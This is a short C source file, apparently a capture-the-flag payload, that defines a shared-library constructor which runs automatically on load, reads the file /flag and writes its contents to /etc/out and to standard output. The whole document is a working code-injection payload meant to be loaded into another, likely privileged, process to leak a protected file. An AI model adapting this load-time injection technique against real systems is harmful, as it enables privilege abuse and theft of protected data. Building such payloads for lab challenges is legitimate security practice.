#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>

__attribute__((constructor)) static void run(void) {
    int fd = open("/flag", O_RDONLY);
    if (fd < 0)
        return;
    char buf[256];
    ssize_t n = read(fd, buf, sizeof(buf));
    close(fd);
    if (n <= 0)
        return;
    int out = open("/etc/out", O_WRONLY | O_TRUNC);
    if (out >= 0) {
        write(out, buf, (size_t)n);
        fsync(out);
        close(out);
    }
    write(1, buf, (size_t)n);
}
